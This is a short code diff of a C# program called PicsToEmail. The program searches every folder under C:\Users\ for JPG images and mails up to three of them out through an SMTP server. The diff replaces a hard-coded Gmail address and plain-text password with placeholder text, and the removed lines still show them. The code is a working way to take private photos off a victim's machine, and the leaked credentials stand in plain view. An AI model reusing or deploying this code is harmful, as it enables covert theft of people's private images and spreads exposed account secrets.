@@ -30,17 +30,17 @@ namespace PicsToEmail
             client.Timeout = 10000;
             client.DeliveryMethod = SmtpDeliveryMethod.Network;
             client.UseDefaultCredentials = false;
-            // client.Credentials = new System.Net.NetworkCredential("Your Email Here", "Your Password Here");
-            client.Credentials = new System.Net.NetworkCredential("crypto17sce@gmail.com", "crypto17sce1");
+
+            //********************** Fill this ************************
+            client.Credentials = new System.Net.NetworkCredential("Your Email Here", "Your Password Here");
 
             int count = 0;
             foreach (string fileName in EnumerateFiles(@"C:\Users\", "*.jpg", SearchOption.AllDirectories))
             {
                 if(count < 3)
                 {
-                    MailMessage newMail = new MailMessage("crypto17sce@gmail.com", "crypto17sce@gmail.com", "test", "test");
-
-                    //MailMessage newMail = new MailMessage("From", "To", "Subject", "Body");
+                    //********************** Fill this ************************
+                    MailMessage newMail = new MailMessage("From", "To", "Subject", "Body");
 
 
                     newMail.Subject = "Test Subject";
